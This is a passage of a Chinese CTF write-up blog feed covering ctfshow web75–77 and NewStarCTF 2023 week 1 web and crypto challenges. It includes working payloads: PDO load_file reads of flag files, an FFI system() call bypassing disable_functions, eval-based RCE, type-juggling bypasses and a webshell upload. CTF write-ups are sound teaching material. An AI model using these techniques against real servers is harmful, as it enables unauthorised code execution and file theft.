class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125; <br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>s设置了<code>include_path</code>无法包含根目录文件<br>用前面的uaf脚本<br><img src="/mdimg/ctfshow77/18.png"><br>ban了<code>strlen()</code><br>官方解是用<code>PDO</code>读数据库<br><img src="/mdimg/ctfshow77/19.png"><br>官方解直接给了一个读<code>ctftraining</code> 的flag<br>实际上需要先找到这个数据库名<br>先连接默认数据库<code>information_schema</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;<br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$dsn</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>    <span class="hljs-variable">$rs</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rs</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; <br>      &#125;<span class="hljs-variable">$db</span> = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/20.png"><br>然后连接<code>ctftraining</code> 通过<code>load_file</code>来读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br>        <span class="hljs-string">&#x27;root&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]) . <span class="hljs-string">&quot;|&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;<br>&#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p><code>flag36d.txt</code>同上</p><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>提示php 7.4<br>php 7.4 引入了 FFI扩展<br>FFI::cdef() 创建一个新的 FFI 对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);  <br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;/readflag &gt; ./b.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过FFI 引入c语言的system 突破disable——function的限制</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023 week1 wp</title>
    <link href="/2023/10/04/NewStarCTF%202023%20week1/"/>
    <url>/2023/10/04/NewStarCTF%202023%20week1/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>丁真<code>robots.txt</code> <code>www.zip</code></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/newstarweek1/1.png"><br>get:<code>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5=2024a</code><br>post:<code>key3[]=3&amp;flag5=(&quot;%08%09%08%05&quot;^&quot;%7c%7b%7d%60&quot;)</code> 异或构造<code>true</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999999999999999</span>):<br>    x=hashlib.md5()<br>    x.update(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    des=x.hexdigest()<br>    <span class="hljs-keyword">if</span> des[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]==<span class="hljs-string">&#x27;c4d038&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#114514</span><br></code></pre></td></tr></table></figure><p><code>password=114514&amp;e[v.a.l=var_dump(scandir(&#39;/&#39;));</code> –&gt; <code>flag</code><br><code>password=114514&amp;e[v.a.l=var_dump(exec(&#39;tac /fl?g&#39;));</code></p><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p><img src="/mdimg/newstarweek1/2.png"><br>抓包发现密码为md5形式的<br>先尝试数字弱密码， 6-18位数字<br><img src="/mdimg/newstarweek1/3.png"><br>密码就是<code>000000</code>……<br>重新登录抓包<br><img src="/mdimg/newstarweek1/4.png"><br>放包然后再抓包<code>[http://node4.buuoj.cn:26958](http://node4.buuoj.cn:26958)/passport/2c702a27a0f27a5c60daf3887be50e515801b211c9d8418ee4d792ce8d924897.php</code><br><img src="/mdimg/newstarweek1/5.png"></p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><code>/?number1=a&amp;number2=a</code>报错直接找flag<br><img src="/mdimg/newstarweek1/6.png"></p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="/mdimg/newstarweek1/13.png"><br><img src="/mdimg/newstarweek1/7.png"></p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>上传图片🐎抓包改后缀php rce</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append(f ^ key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><br></code></pre></td></tr></table></figure><p>先推key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># print(ord(&#x27;f&#x27;)^int(&#x27;e9&#x27;,16))   143</span><br><span class="hljs-comment"># print(ord(&#x27;l&#x27;)^int(&#x27;e3&#x27;,16))   143</span><br><br>key=<span class="hljs-number">143</span><br><br>a=<span class="hljs-string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)^key),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><p><img src="/mdimg/newstarweek1/8.png"><br><img src="/mdimg/newstarweek1/9.png"></p><h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">part <span class="hljs-number">1</span> of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=        base64<br>part <span class="hljs-number">2</span> of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=       base32<br>part <span class="hljs-number">3</span> of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`              uudecode<br></code></pre></td></tr></table></figure><h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>维纳攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continuedFra</span>(<span class="hljs-params">x, y</span>):<br><br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradualFra</span>(<span class="hljs-params">cf</span>):<br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment"># 这里的渐进分数分子分母要分开</span><br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pq</span>(<span class="hljs-params">a, b, c</span>):<br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getGradualFra</span>(<span class="hljs-params">cf</span>):<br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br>n = <br>e = <br>c = <br>d = wienerAttack(e, n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>n分解多个因数</p><p>yafu分解 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p_list</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">phi</span>= <span class="hljs-number">1</span><br><span class="hljs-attribute">for</span> p in p_list:<br>    <span class="hljs-attribute">phi</span> *= (p-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>循环求欧拉函数就行</p><h2 id="fence"><a href="#fence" class="headerlink" title="fence"></a>fence</h2><p><img src="/mdimg/newstarweek1/10.png"></p><h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p><img src="/mdimg/newstarweek1/11.png"></p><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p><img src="/mdimg/newstarweek1/12.png"></p><h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag, key<br><br>modulus = <span class="hljs-number">256</span><br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append((key[<span class="hljs-number">0</span>]*f + key[<span class="hljs-number">1</span>]) % modulus)          <span class="hljs-comment"># </span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><br></code></pre></td></tr></table></figure><p>仿射密码五个字符<br>思路是复用加密，利用<code>flag&#123;</code>爆破出 key[0] 和 key[1]<br>然后利用解密函数解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (-<span class="hljs-number">200</span>,<span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;dd&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;l&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;43&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;88&#x27;</span>,<span class="hljs-number">16</span>) <span class="hljs-keyword">and</span> (a*<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;g&#x27;</span>)+b)%<span class="hljs-number">256</span> == <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;ee&#x27;</span>,<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">print</span>(a,b)<br><br>a=<span class="hljs-string">&#x27;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-number">241</span>*(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">23</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#17 23</span><br><span class="hljs-comment">#flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
